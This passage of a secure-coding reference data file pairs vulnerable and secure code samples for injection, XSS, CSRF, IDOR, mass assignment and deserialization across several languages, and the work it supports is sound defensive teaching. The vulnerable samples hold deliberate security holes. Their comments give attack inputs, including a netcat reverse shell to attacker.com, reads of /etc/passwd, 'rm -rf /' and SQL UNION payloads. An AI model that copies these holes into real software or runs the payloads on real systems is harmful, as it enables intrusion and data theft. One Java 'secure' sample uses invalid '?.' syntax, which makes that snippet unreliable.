    rows, err := db.Query(query)
    // Attacker input: ' OR '1'='1' --

    // Also vulnerable:
    query2 := "SELECT * FROM users WHERE id = " + r.URL.Query().Get("id")
    db.Query(query2)
    // Attacker input: 1 UNION SELECT password FROM users
}`,
    secure: `// SECURE — Parameterized queries in Go
package main

import (
    "database/sql"
    "net/http"

    "gorm.io/gorm"
)

var db *sql.DB
var gormDB *gorm.DB

// Option 1: database/sql with placeholders
func getUserSafe(w http.ResponseWriter, r *http.Request) {
    username := r.URL.Query().Get("username")

    // PostgreSQL uses $1, $2; MySQL uses ?
    row := db.QueryRow(
        "SELECT id, username, email FROM users WHERE username = $1",
        username, // Automatically escaped
    )

    var user User
    err := row.Scan(&user.ID, &user.Username, &user.Email)
    if err == sql.ErrNoRows {
        http.Error(w, "Not found", http.StatusNotFound)
        return
    }
}

// Option 2: GORM ORM (recommended)
func getUserGORM(w http.ResponseWriter, r *http.Request) {
    username := r.URL.Query().Get("username")

    var user User
    result := gormDB.Where("username = ?", username).First(&user)
    if result.Error != nil {
        http.Error(w, "Not found", http.StatusNotFound)
        return
    }

    // Safe LIKE queries:
    // gormDB.Where("name LIKE ?", "%"+username+"%").Find(&users)
}

// Option 3: sqlx named queries
// row := sqlxDB.NamedQuery(
//     "SELECT * FROM users WHERE username = :username",
//     map[string]interface{}{"username": username},
// )`,
    explanation: "Go's database/sql package supports parameterized queries with $1 (PostgreSQL) or ? (MySQL) placeholders. GORM provides a safe ORM layer. Never use fmt.Sprintf or string concatenation for SQL queries.",
  },
  {
    id: "go-command-injection",
    title: "Command Injection Prevention",
    language: "Go",
    category: "Injection",
    cweId: "CWE-78",
    cweName: "OS Command Injection",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent OS command injection in Go applications.",
    vulnerable: `// VULNERABLE — Shell execution with user input
package main

import (
    "net/http"
    "os/exec"
)

func pingHandler(w http.ResponseWriter, r *http.Request) {
    host := r.URL.Query().Get("host")

    // DANGEROUS — passing user input to shell
    cmd := exec.Command("sh", "-c", "ping -c 4 "+host)
    output, _ := cmd.CombinedOutput()
    w.Write(output)

    // Attacker: ?host=example.com;cat /etc/passwd
    // Attacker: ?host=example.com|nc attacker.com 4444 -e /bin/sh
}`,
    secure: `// SECURE — Safe command execution in Go
package main

import (
    "context"
    "net/http"
    "os/exec"
    "regexp"
    "time"
)

var hostnameRegex = regexp.MustCompile(
    \`^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z]{2,})+$\`,
)

func pingHandlerSafe(w http.ResponseWriter, r *http.Request) {
    host := r.URL.Query().Get("host")

    // Validate input format
    if !hostnameRegex.MatchString(host) {
        http.Error(w, "Invalid hostname", http.StatusBadRequest)
        return
    }

    // Use context with timeout
    ctx, cancel := context.WithTimeout(
        context.Background(), 30*time.Second,
    )
    defer cancel()

    // Pass arguments as separate strings — NOT through shell
    cmd := exec.CommandContext(ctx, "ping", "-c", "4", host)

    // Restrict environment
    cmd.Env = []string{}

    output, err := cmd.CombinedOutput()
    if err != nil {
        http.Error(w, "Command failed", http.StatusInternalServerError)
        return
    }

    w.Write(output)
}

// Key rules:
// 1. Never use exec.Command("sh", "-c", userInput)
// 2. Pass each argument separately to exec.Command
// 3. Validate input with strict regex
// 4. Use context with timeout
// 5. Restrict environment variables`,
    explanation: "Go's exec.Command can safely pass arguments without shell interpretation when arguments are separate strings. Never use 'sh -c' with user input. Always validate input format and set execution timeouts.",
  },

  // ==================== RUBY ====================
  {
    id: "ruby-sql-injection",
    title: "SQL Injection Prevention",
    language: "Ruby",
    category: "Injection",
    cweId: "CWE-89",
    cweName: "SQL Injection",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent SQL injection in Ruby on Rails using ActiveRecord safely.",
    vulnerable: `# VULNERABLE — String interpolation in queries
class UsersController < ApplicationController
  def search
    username = params[:username]

    # DANGEROUS — direct interpolation
    @user = User.where("username = '#{username}'").first

    # Also vulnerable:
    @users = User.where("name LIKE '%#{params[:q]}%'")

    # Even worse — raw SQL with interpolation:
    results = ActiveRecord::Base.connection.execute(
      "SELECT * FROM users WHERE email = '#{params[:email]}'"
    )
  end

  # Attacker input: ' OR '1'='1' --
  # Attacker input: ' UNION SELECT password FROM users --
end`,
    secure: `# SECURE — Parameterized queries with ActiveRecord
class UsersController < ApplicationController
  def search
    username = params[:username]

    # Option 1: Hash conditions (safest for equality)
    @user = User.find_by(username: username)

    # Option 2: Placeholder conditions
    @user = User.where("username = ?", username).first

    # Option 3: Named placeholders
    @users = User.where(
      "name LIKE :query",
      query: "%#{User.sanitize_sql_like(params[:q])}%"
    )

    # Option 4: Arel for complex queries (type-safe)
    users_table = User.arel_table
    @users = User.where(
      users_table[:name].matches("%#{params[:q]}%")
    )

    # Safe scope in model:
    # scope :by_role, ->(role) { where(role: role) }
    # scope :search_name, ->(q) {
    #   where("name LIKE ?", "%#{sanitize_sql_like(q)}%")
    # }
  end
end

# Additional protection in config/application.rb:
# config.active_record.warn_on_records_fetched_greater_than = 1000`,
    explanation: "Rails' ActiveRecord provides safe query methods. Use hash conditions, ? placeholders, or named placeholders. Use sanitize_sql_like for LIKE queries. Arel provides type-safe query building. Never interpolate params into SQL strings.",
  },
  {
    id: "ruby-mass-assignment",
    title: "Mass Assignment Prevention",
    language: "Ruby",
    category: "Access Control",
    cweId: "CWE-915",
    cweName: "Improperly Controlled Modification of Dynamically-Determined Object Attributes",
    owaspId: "A01:2021",
    owaspName: "Broken Access Control",
    description: "Prevent mass assignment vulnerabilities in Ruby on Rails.",
    vulnerable: `# VULNERABLE — No parameter filtering
class UsersController < ApplicationController
  def update
    @user = User.find(params[:id])
    # DANGEROUS — accepts ALL parameters
    @user.update(params[:user])
    # Attacker sends: { user: { role: "admin", verified: true } }
    # They just made themselves an admin!
  end

  def create
    # Also vulnerable:
    @user = User.new(params[:user])
    @user.save
  end
end

# The infamous GitHub 2012 mass assignment attack:
# Attacker added their SSH key to the Rails project
# by exploiting unprotected User.update(params[:user])`,
    secure: `# SECURE — Strong Parameters in Rails
class UsersController < ApplicationController
  def update
    @user = User.find(params[:id])
    @user.update(user_params) # Only permitted params
    redirect_to @user
  end

  def create
    @user = User.new(user_params)
    if @user.save
      redirect_to @user
    else
      render :new
    end
  end

  private

  # Whitelist specific allowed parameters
  def user_params
    params.require(:user).permit(
      :name, :email, :bio, :avatar
      # role, verified, admin are NOT listed = protected
    )
  end

  # Admin-only params with role check
  def admin_user_params
    if current_user.admin?
      params.require(:user).permit(
        :name, :email, :bio, :avatar, :role, :verified
      )
    else
      user_params
    end
  end
end

# Additional model-level protection:
# class User < ApplicationRecord
#   # Explicitly define which attrs are NOT mass-assignable
#   attr_readonly :role, :email_verified
# end`,
    explanation: "Rails' Strong Parameters require explicitly whitelisting which request parameters are allowed for mass assignment. Never pass params directly to create/update. Use separate permit lists for regular users and admins.",
  },

  // ==================== JAVASCRIPT/NODE.JS ====================
  {
    id: "js-nosql-injection",
    title: "NoSQL Injection Prevention",
    language: "JavaScript",
    category: "Injection",
    cweId: "CWE-943",
    cweName: "Improper Neutralization of Special Elements in Data Query Logic",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent NoSQL injection in Node.js applications using MongoDB.",
    vulnerable: `// VULNERABLE — Direct use of request body in MongoDB query
const express = require('express');
const app = express();
app.use(express.json());

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  // Attacker sends: { "username": {"$gt": ""}, "password": {"$gt": ""} }
  // This matches ALL users — query becomes: { username: {$gt: ""}, password: {$gt: ""} }
  const user = await db.collection('users').findOne({
    username: username,
    password: password,
  });
  if (user) {
    return res.json({ token: generateToken(user) });
  }
  res.status(401).json({ error: 'Invalid credentials' });
});

// Another attack: { "username": {"$regex": "^admin"} }
// This finds users whose name starts with "admin"`,
    secure: `// SECURE — Input validation and type checking
const express = require('express');
const { z } = require('zod');
const bcrypt = require('bcrypt');

const loginSchema = z.object({
  username: z.string().min(1).max(100),
  password: z.string().min(1).max(200),
});

app.post('/api/login', async (req, res) => {
  // Validate and parse input — rejects MongoDB operators
  const result = loginSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ error: 'Invalid input' });
  }

  const { username, password } = result.data;

  // Explicit string type ensures no operator injection
  const user = await db.collection('users').findOne({
    username: String(username),
  });

  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Compare hashed passwords (never store plain text)
  const validPassword = await bcrypt.compare(password, user.passwordHash);
  if (!validPassword) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  res.json({ token: generateToken(user) });
});

// Mongoose with schema validation also helps:
// username: { type: String, required: true }
// This rejects objects like { "$gt": "" }`,
    explanation: "MongoDB query operators like $gt, $regex, $ne can be injected via JSON request bodies. Use schema validation (Zod, Joi) to enforce string types. Wrap values in String() before queries. Use Mongoose schemas which reject non-string types.",
  },
  {
    id: "js-prototype-pollution",
    title: "Prototype Pollution Prevention",
    language: "JavaScript",
    category: "Injection",
    cweId: "CWE-1321",
    cweName: "Improperly Controlled Modification of Object Prototype Attributes",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent prototype pollution attacks in JavaScript/Node.js applications.",
    vulnerable: `// VULNERABLE — Unsafe recursive merge
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attacker sends JSON:
// { "__proto__": { "isAdmin": true } }
const userInput = JSON.parse('{"__proto__":{"isAdmin":true}}');
merge({}, userInput);

// Now ALL objects have isAdmin = true!
const user = {};
console.log(user.isAdmin); // true — EXPLOITED!

// Real-world impact: bypass authentication, RCE via polluted
// options objects in template engines (e.g., Handlebars, Pug)`,
    secure: `// SECURE — Safe merge with prototype check
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    // Block prototype pollution keys
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }

    if (
      typeof source[key] === 'object' &&
      source[key] !== null &&
      !Array.isArray(source[key])
    ) {
      if (!Object.hasOwn(target, key)) {
        target[key] = {};
      }
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Option 2: Use Map instead of plain objects
const config = new Map();
config.set('theme', userInput.theme); // No prototype chain

// Option 3: Object.create(null) — no prototype chain
const safeObj = Object.create(null);
safeObj.name = userInput.name; // Safe

// Option 4: Use Object.freeze(Object.prototype) in critical paths
// Option 5: Use structured clone
const safeCopy = structuredClone(userInput);

// Input validation with Zod:
const schema = z.object({
  name: z.string(),
  theme: z.enum(['light', 'dark']),
}).strict(); // Rejects unknown keys like __proto__`,
    explanation: "Prototype pollution occurs when attackers modify Object.prototype via __proto__, constructor, or prototype properties. Filter these keys in merge operations, use Map/Object.create(null), or validate input with schema libraries that reject unknown keys.",
  },

  // ==================== PYTHON ADDITIONAL ====================
  {
    id: "py-insecure-deserialization",
    title: "Insecure Deserialization Prevention",
    language: "Python",
    category: "Insecure Deserialization",
    cweId: "CWE-502",
    cweName: "Deserialization of Untrusted Data",
    owaspId: "A08:2021",
    owaspName: "Software and Data Integrity Failures",
    description: "Prevent insecure deserialization attacks in Python using pickle and YAML.",
    vulnerable: `# VULNERABLE — Deserializing untrusted pickle data
import pickle
import yaml

# pickle can execute arbitrary code!
def load_user_data(serialized_data):
    return pickle.loads(serialized_data)
    # Attacker crafts a pickle payload that runs:
    # os.system("rm -rf /") or reverse shell

# YAML load() also allows code execution
def parse_config(yaml_string):
    return yaml.load(yaml_string)  # Unsafe!
    # Attacker sends: !!python/object/apply:os.system ["cat /etc/passwd"]

# Flask session with pickle serializer
# Attacker modifies session cookie to inject pickle payload`,
    secure: `# SECURE — Safe serialization alternatives
import json
import yaml
from marshmallow import Schema, fields
import hmac
import hashlib

# Option 1: Use JSON (no code execution possible)
def load_user_data(json_string: str) -> dict:
    return json.loads(json_string)  # Safe — only basic types

# Option 2: YAML safe_load (blocks code execution)
def parse_config(yaml_string: str) -> dict:
    return yaml.safe_load(yaml_string)  # Only basic YAML types

# Option 3: Validate with marshmallow schema
class UserSchema(Schema):
    name = fields.Str(required=True)
    email = fields.Email(required=True)
    role = fields.Str(validate=lambda x: x in ['user', 'editor'])

user_schema = UserSchema()

def deserialize_user(data: dict):
    result = user_schema.load(data)  # Validates structure & types
    return result

# Option 4: If pickle is REQUIRED, sign and verify
SECRET_KEY = b'your-secret-key'

def safe_serialize(data: dict) -> bytes:
    serialized = json.dumps(data).encode()
    signature = hmac.new(SECRET_KEY, serialized, hashlib.sha256).hexdigest()
    return json.dumps({"data": serialized.decode(), "sig": signature}).encode()

def safe_deserialize(payload: bytes) -> dict:
    parsed = json.loads(payload)
    expected_sig = hmac.new(
        SECRET_KEY, parsed["data"].encode(), hashlib.sha256
    ).hexdigest()
    if not hmac.compare_digest(parsed["sig"], expected_sig):
        raise ValueError("Signature verification failed")
    return json.loads(parsed["data"])`,
    explanation: "Never use pickle.loads() or yaml.load() on untrusted data — both allow arbitrary code execution. Use JSON for data exchange, yaml.safe_load() for YAML configs, and schema validation (marshmallow, pydantic) for structured data.",
  },

  // ==================== GO ADDITIONAL ====================
  {
    id: "go-xss-prevention",
    title: "Cross-Site Scripting (XSS) Prevention",
    language: "Go",
    category: "XSS",
    cweId: "CWE-79",
    cweName: "Cross-site Scripting",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent XSS attacks in Go web applications using html/template.",
    vulnerable: `// VULNERABLE — Using text/template for HTML
package main

import (
    "fmt"
    "net/http"
    "text/template" // WRONG — this does NOT escape HTML
)

func handler(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    // text/template does NOT auto-escape!
    tmpl := template.Must(template.New("").Parse(
        "<h1>Hello, {{.Name}}</h1>",
    ))
    tmpl.Execute(w, map[string]string{"Name": name})

    // Even worse — direct string formatting
    fmt.Fprintf(w, "<h1>Hello, %s</h1>", name)

    // Attacker: ?name=<script>alert('XSS')</script>
}`,
    secure: `// SECURE — Using html/template (auto-escapes)
package main

import (
    "html/template" // CORRECT — auto-escapes HTML context
    "net/http"

    "github.com/microcosm-cc/bluemonday"
)

func handler(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")

    // html/template auto-escapes based on context!
    tmpl := template.Must(template.New("page").Parse(\`
        <h1>Hello, {{.Name}}</h1>
        <a href="/profile?user={{.Name}}">Profile</a>
        <script>var user = "{{.Name}}";</script>
    \`))
    // Each context gets proper escaping:
    // HTML: <, >, & encoded
    // URL: query-escaped
    // JS: JSON-safe escaped
    tmpl.Execute(w, map[string]string{"Name": name})
}

// For rich content — use bluemonday sanitizer
func commentHandler(w http.ResponseWriter, r *http.Request) {
    content := r.FormValue("content")

    // Strict policy — only basic formatting
    p := bluemonday.UGCPolicy() // User Generated Content
    safe := p.Sanitize(content)

    tmpl := template.Must(template.New("").Parse(
        \`<div class="comment">{{.}}</div>\`,
    ))
    tmpl.Execute(w, template.HTML(safe)) // Pre-sanitized
}`,
    explanation: "Always use html/template (not text/template) for HTML output in Go. It automatically escapes based on context (HTML, URL, JS). For rich content, sanitize with bluemonday before marking as template.HTML.",
  },

  // ==================== JAVA ADDITIONAL ====================
  {
    id: "java-broken-auth",
    title: "Secure Session Management",
    language: "Java",
    category: "Authentication",
    cweId: "CWE-384",
    cweName: "Session Fixation",
    owaspId: "A07:2021",
    owaspName: "Identification and Authentication Failures",
    description: "Prevent session fixation and implement secure session management in Java.",
    vulnerable: `// VULNERABLE — Session fixation and weak session handling
import javax.servlet.http.*;

public class LoginServlet extends HttpServlet {
    protected void doPost(HttpServletRequest req,
                          HttpServletResponse resp) {
        String user = req.getParameter("username");
        String pass = req.getParameter("password");

        if (authenticate(user, pass)) {
            // BUG — reusing existing session (session fixation)
            HttpSession session = req.getSession();
            session.setAttribute("user", user);
            session.setAttribute("authenticated", true);
            // Attacker pre-sets session ID via URL or cookie,
            // victim logs in, attacker uses same session ID
        }
    }
}

// web.xml with weak session config:
// <session-config>
//   <session-timeout>720</session-timeout> <!-- 12 hours! -->
//   <cookie-config>
//     <http-only>false</http-only>  <!-- JS can read cookie -->
//     <secure>false</secure>  <!-- Sent over HTTP -->
//   </cookie-config>
// </session-config>`,
    secure: `// SECURE — Proper session management
import javax.servlet.http.*;

public class LoginServlet extends HttpServlet {
    protected void doPost(HttpServletRequest req,
                          HttpServletResponse resp) {
        String user = req.getParameter("username");
        String pass = req.getParameter("password");

        if (authenticate(user, pass)) {
            // Invalidate old session to prevent fixation
            req.getSession(false)?.invalidate();

            // Create new session with new ID
            HttpSession session = req.getSession(true);
            session.setAttribute("user", user);
            session.setAttribute("authenticated", true);
            session.setMaxInactiveInterval(1800); // 30 min

            // Regenerate CSRF token too
            session.setAttribute("csrfToken",
                UUID.randomUUID().toString());
        }
    }

    // Logout properly
    protected void doLogout(HttpServletRequest req,
                            HttpServletResponse resp) {
        HttpSession session = req.getSession(false);
        if (session != null) {
            session.invalidate();
        }
        // Clear cookie
        Cookie cookie = new Cookie("JSESSIONID", "");
        cookie.setMaxAge(0);
        cookie.setPath("/");
        resp.addCookie(cookie);
    }
}

// web.xml — Secure session configuration:
// <session-config>
//   <session-timeout>30</session-timeout>
//   <cookie-config>
//     <http-only>true</http-only>
//     <secure>true</secure>
//     <same-site>Strict</same-site>
//   </cookie-config>
//   <tracking-mode>COOKIE</tracking-mode>
// </session-config>`,
    explanation: "Always invalidate the old session and create a new one after login to prevent session fixation. Set HttpOnly, Secure, and SameSite flags on session cookies. Use short session timeouts and proper logout procedures.",
  },

  // ==================== PHP ADDITIONAL ====================
  {
    id: "php-csrf",
    title: "CSRF Protection",
    language: "PHP",
    category: "CSRF",
    cweId: "CWE-352",
    cweName: "Cross-Site Request Forgery",
    owaspId: "A01:2021",
    owaspName: "Broken Access Control",
    description: "Implement CSRF protection in PHP applications.",
    vulnerable: `<?php
// VULNERABLE — No CSRF protection
// transfer.php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $to = $_POST['to_account'];
    $amount = $_POST['amount'];
    // No verification that request came from our site!
    transferFunds($_SESSION['user_id'], $to, $amount);
    echo "Transfer successful!";
}
?>
<form method="POST">
    <input name="to_account" placeholder="Recipient">
    <input name="amount" placeholder="Amount">
    <button type="submit">Transfer</button>
</form>

<!-- Attacker's evil page: -->
<!-- <img src="https://bank.com/transfer?to=attacker&amount=10000"> -->
<!-- Or hidden auto-submitting form targeting bank.com -->`,
    secure: `<?php
// SECURE — Synchronizer Token Pattern
session_start();

class CSRF {
    // Generate a cryptographically random token
    public static function generateToken(): string {
        if (empty($_SESSION['csrf_token'])) {
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        }
        return $_SESSION['csrf_token'];
    }

    // Validate the token with timing-safe comparison
    public static function validateToken(string $token): bool {
        if (empty($_SESSION['csrf_token'])) {
            return false;
        }
        return hash_equals($_SESSION['csrf_token'], $token);
    }

    // Output hidden input field
    public static function field(): string {
        $token = self::generateToken();
        return '<input type="hidden" name="csrf_token" value="'
               . htmlspecialchars($token, ENT_QUOTES) . '">';
    }
}

// In form handler:
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!CSRF::validateToken($_POST['csrf_token'] ?? '')) {
        http_response_code(403);
        die('CSRF validation failed');
    }
    // Process legitimate request
    transferFunds($_SESSION['user_id'], $_POST['to_account'], $_POST['amount']);

    // Rotate token after use (one-time use)
    unset($_SESSION['csrf_token']);
}
?>
<form method="POST" action="/transfer">
    <?= CSRF::field() ?>
    <input name="to_account" placeholder="Recipient">
    <input name="amount" placeholder="Amount">
    <button type="submit">Transfer</button>
</form>

<!-- Laravel has built-in @csrf directive -->
<!-- <form method="POST"> @csrf ... </form> -->`,
    explanation: "CSRF tokens verify that form submissions originate from your site. Generate a random token per session, embed it in forms, and validate it server-side using timing-safe comparison (hash_equals). Rotate tokens after sensitive operations.",
  },

  // ==================== C# ADDITIONAL ====================
  {
    id: "csharp-broken-access",
    title: "Broken Access Control Prevention",
    language: "C#",
    category: "Access Control",
    cweId: "CWE-639",
    cweName: "Authorization Bypass Through User-Controlled Key",
    owaspId: "A01:2021",
    owaspName: "Broken Access Control",
    description: "Prevent IDOR and broken access control in ASP.NET Core.",
    vulnerable: `// VULNERABLE — No authorization check on resource access
[ApiController]
[Route("api/[controller]")]
public class OrdersController : ControllerBase
{
    [HttpGet("{id}")]
    public async Task<IActionResult> GetOrder(int id)
    {
        // DANGEROUS — any authenticated user can access ANY order
        var order = await _db.Orders.FindAsync(id);
        if (order == null) return NotFound();
        return Ok(order);
        // Attacker changes id=123 to id=456 to see other users' orders
    }

    [HttpDelete("{id}")]
    public async Task<IActionResult> DeleteOrder(int id)
    {
        // Anyone can delete anyone's order!
        var order = await _db.Orders.FindAsync(id);
        _db.Orders.Remove(order);
        await _db.SaveChangesAsync();
        return NoContent();
    }
}`,
    secure: `// SECURE — Proper authorization with resource-level checks
[ApiController]
[Route("api/[controller]")]
[Authorize] // Require authentication
public class OrdersController : ControllerBase
{
    private readonly AppDbContext _db;

    // Get current user's ID from claims
    private int GetUserId() =>
        int.Parse(User.FindFirst(ClaimTypes.NameIdentifier)!.Value);

    [HttpGet("{id}")]
    public async Task<IActionResult> GetOrder(int id)
    {
        var userId = GetUserId();
        var order = await _db.Orders
            .Where(o => o.Id == id && o.UserId == userId) // Ownership check!
            .FirstOrDefaultAsync();
        if (order == null) return NotFound();
        return Ok(order);
    }

    [HttpGet]
    public async Task<IActionResult> GetMyOrders()
    {
        var userId = GetUserId();
        // Only return current user's orders
        var orders = await _db.Orders
            .Where(o => o.UserId == userId)
            .OrderByDescending(o => o.CreatedAt)
            .ToListAsync();
        return Ok(orders);
    }

    [HttpDelete("{id}")]
    public async Task<IActionResult> DeleteOrder(int id)
    {
        var userId = GetUserId();
        var order = await _db.Orders
            .Where(o => o.Id == id && o.UserId == userId)
            .FirstOrDefaultAsync();
        if (order == null) return NotFound();
        _db.Orders.Remove(order);
        await _db.SaveChangesAsync();
        return NoContent();
    }

    // Admin-only endpoint with policy-based auth
    [HttpGet("admin/all")]
    [Authorize(Policy = "AdminOnly")]
    public async Task<IActionResult> GetAllOrders()
    {
        return Ok(await _db.Orders.ToListAsync());
    }
}

// In Program.cs:
// builder.Services.AddAuthorization(options =>
//     options.AddPolicy("AdminOnly",
//         policy => policy.RequireRole("Admin")));`,
    explanation: "Always verify resource ownership by filtering queries with the current user's ID. Use [Authorize] attribute for authentication and policy-based authorization for role checks. Never trust client-supplied IDs alone — always validate ownership server-side.",
  },

  // ==================== RUBY ADDITIONAL ====================
  {
    id: "ruby-command-injection",
    title: "Command Injection Prevention",
    language: "Ruby",
    category: "Injection",
    cweId: "CWE-78",
    cweName: "OS Command Injection",
    owaspId: "A03:2021",
    owaspName: "Injection",
    description: "Prevent OS command injection in Ruby applications.",
    vulnerable: `# VULNERABLE — Shell execution with user input
class ToolsController < ApplicationController
  def ping
    host = params[:host]

    # ALL of these are dangerous with user input:
    result = \`ping -c 4 #{host}\`           # Backticks
    result = %x(ping -c 4 #{host})         # %x{}
    result = system("ping -c 4 #{host}")   # system()
    result = exec("ping -c 4 #{host}")     # exec()
    result = IO.popen("ping -c 4 #{host}") # IO.popen

    # Attacker input: "example.com; cat /etc/passwd"
    # Attacker input: "example.com && rm -rf /"

    render plain: result
  end
end`,
    secure: `# SECURE — Safe command execution in Ruby
require 'open3'
require 'shellwords'

class ToolsController < ApplicationController
  HOSTNAME_REGEX = /\\A[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z]{2,})+\\z/

  def ping
    host = params[:host].to_s

    # Validate input format
    unless host.match?(HOSTNAME_REGEX)
      return render json: { error: 'Invalid hostname' }, status: :bad_request
    end

    # Option 1: Array form of system/Open3 (no shell interpretation)
    stdout, stderr, status = Open3.capture3(
      'ping', '-c', '4', host  # Each arg is separate — safe!
    )

    if status.success?
      render plain: stdout
    else
      render plain: "Failed: #{stderr}", status: :unprocessable_entity
    end
  end

  # Option 2: If shell is absolutely required, use Shellwords
  def whois
    domain = params[:domain].to_s
    unless domain.match?(HOSTNAME_REGEX)
      return render json: { error: 'Invalid domain' }, status: :bad_request
    end

    # Shellwords.escape safely quotes the argument
    safe_domain = Shellwords.escape(domain)
    result = \`whois #{safe_domain}\`

    render plain: result
  end
end`,
    explanation: "Ruby has many ways to execute shell commands — backticks, system(), exec(), Open3. Use the array form (Open3.capture3('cmd', 'arg1', 'arg2')) to avoid shell interpretation. If shell is needed, use Shellwords.escape. Always validate input format.",
  },
];
